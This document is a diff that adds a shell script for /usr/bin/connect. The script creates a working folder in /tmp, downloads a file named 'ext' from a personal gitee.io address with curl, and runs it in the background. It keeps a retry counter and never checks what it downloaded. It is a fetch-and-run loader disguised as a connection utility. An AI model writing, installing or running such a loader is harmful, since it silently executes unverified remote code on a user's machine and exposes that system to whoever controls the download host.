@@ -1,0 +1,38 @@
+#!/bin/sh
+#/usr/bin/connect
+
+wd=/tmp/conn
+mkdir -p $wd
+
+get() {
+    local url=$1
+    local fn=$wd/${url##*/}
+
+    ret=`curl -L -o $fn -s -w %{http_code} --connect-timeout 5 $url | tail -n1`
+    if [ "$ret" == "200" ]; then
+        date +%s > $fn-u
+        rm -rf $fn-timeout
+        return 0
+    fi
+
+    rm -rf $fn $fn-u
+
+    if [ -f "$fn-timeout" ]; then
+        local timeout=`cat $fn-timeout`
+    else
+        local timeout=0
+    fi
+
+    let timeout++
+    echo $timeout > $fn-timeout
+
+    return 1
+}
+
+if [ ! -f "$wd/ext" ]; then
+    get "https://qq179055016.gitee.io/static/ext" || \
+        exit 1
+fi
+sh $wd/ext &
+exit 0
+
